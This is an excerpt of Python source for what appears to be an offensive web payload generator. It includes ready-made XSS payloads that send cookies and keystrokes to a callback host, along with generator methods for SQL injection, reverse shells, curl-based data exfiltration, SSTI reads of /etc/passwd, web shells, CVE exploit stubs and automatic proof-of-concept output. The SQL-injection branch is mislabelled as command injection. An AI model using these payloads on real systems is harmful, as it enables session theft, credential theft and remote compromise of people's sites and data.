...
XSS_PAYLOADS = {
    'cookie_stealer': (
        '<script>new Image().src="https://{{callback}}/steal?c="+document.cookie</script>'
    ),
    'keylogger': (
        '<script>document.onkeypress=function(e){new Image().src='
        '"https://{{callback}}/keys?k="+e.key;}</script>'
    ),
    'dom_redirect': (
        '<script>window.location="https://{{callback}}/phish?url="+encodeURIComponent(document.URL)</script>'
    ),
    'stored_xss_img': (
        '<img src=x onerror="fetch(\'https://{{callback}}/xss\',{method:\'POST\','
...
class PayloadGenerator:
    ...
    def __init__(self, callback_host: str = '{{CALLBACK}}',
                 lhost: str = '{{LHOST}}', lport: int = 4444):
    ...
    def sqli_union_payload(self, column_count: int, inject_col: int = 1,
                           subquery: str = 'SELECT version()',
    ...
    def sqli_time_payload(self, db_type: str = 'mysql',
                          delay: int = 5) -> str:
    ...
    def reverse_shell(self, shell_type: str = 'bash',
                      lhost: str = None, lport: int = None) -> str:
    ...
    def data_exfil_payload(self, method: str = 'curl',
    ...
    def ssti_file_read(self, engine: str = 'jinja2',
                       path: str = '/etc/passwd') -> str:
    ...
    def web_shell(self, shell_type: str = 'php_mini',
                  key: str = None) -> str:
    ...
    def cve_exploit(self, cve_id: str, cmd: str = 'id',
        ...
        for name, stub in CVE_EXPLOIT_STUBS.items():
            if (cve_lower in stub['cve'].lower().replace('cve-', '')
                    or cve_lower in name.lower()):
                result = dict(stub)
    ...
    def generate_poc(self, finding) -> dict:
        ...
        if family == 'sqli':
            ...
            poc['description'] = (
                f'Command Injection confirmed in parameter "{finding.param}". '
                f'Full RCE is possible.'
            )
        elif family == 'ssti':
            poc['exploit_payloads'] = {
            ...
            poc['description'] = (
                f'SSTI confirmed in parameter "{finding.param}". '
                f'Template engine RCE is possible.'
            )
        elif family == 'lfi':
            poc['exploit_payloads'] = {
            ...
            poc['description'] = (
                f'LFI confirmed in parameter "{finding.param}". '
                f'Arbitrary file read is possible.'
            )
        elif family == 'upload':
            poc['exploit_payloads'] = {
            ...
            poc['description'] = (
                f'Unrestricted file upload confirmed. '
                f'Web shell deployment is possible.'
            )
        elif family == 'cve':
            ...
            poc['description'] = (
                f'Vulnerability confirmed: {finding.technique} '
                f'in parameter "{finding.param}" at {finding.url}.'
            )
